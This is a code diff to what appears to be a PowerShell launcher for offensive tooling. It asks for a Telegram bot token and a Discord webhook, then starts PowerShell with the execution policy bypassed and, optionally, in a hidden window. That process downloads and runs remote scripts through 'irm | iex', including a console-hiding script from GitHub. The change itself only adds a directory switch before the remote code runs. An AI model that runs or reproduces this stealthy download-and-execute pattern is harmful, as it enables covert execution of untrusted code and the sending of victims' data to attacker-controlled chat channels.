@@ -119,13 +119,14 @@ while ($true){
         $tg = "Enter a Telegram Bot Token (Optional) "
         $dc = "Enter a Discord webhook (Optional) "
 
+        $fpath = $PWD.Path
         $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
         $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
         If ($hidden -eq 'y'){
-            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ;`$tg = `'$tg`' ;`$dc = `'$dc`' ; irm $url | iex")
+            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; cd $fpath;`$tg = `'$tg`' ;`$dc = `'$dc`' ; irm $url | iex")
         }
         else{
-            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$dc = `'$dc`' ; irm $url | iex")
+            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C cd $fpath; `$tg = `'$tg`' ;`$dc = `'$dc`' ; irm $url | iex")
         }
         
     } else {
